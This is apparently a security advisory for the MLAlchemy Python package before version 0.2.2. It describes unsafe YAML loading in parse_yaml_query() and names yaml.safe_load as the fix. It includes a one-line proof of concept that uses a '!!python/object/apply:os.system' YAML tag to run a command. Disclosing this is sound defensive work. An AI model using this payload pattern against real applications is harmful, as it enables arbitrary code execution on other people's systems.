## Overview 

`MLAlchemy` is a Python-based utility library aimed at allowing relatively safe conversion from YAML/JSON to SQLAlchemy read-only queries. One use case here is to allow RESTful web applications (written in Python) to receive YAML- or JSON-based queries for data, e.g. from a front-end JavaScript-based application. By exploiting vulnerability, attackers can execute arbitrary python commands resulting in command execution. Due to a wide range of involved, the vulnerability is extremely dangerous.

An issue was discovered in the `MLAlchemy` package before `0.2.2`.Untrusted data passed into the `parse_yaml_query()` function can execute arbitrary python commands resulting in command execution.


## POC

```
from mlalchemy import parse_yaml_query
parse_yaml_query('!!python/object/apply:os.system ["calc.exe"]')

```

## Remediation

The updated versions of `MLAlchemy (0.2.2)` correctly use the `yaml.safe_load` method which prevents remote code execution.
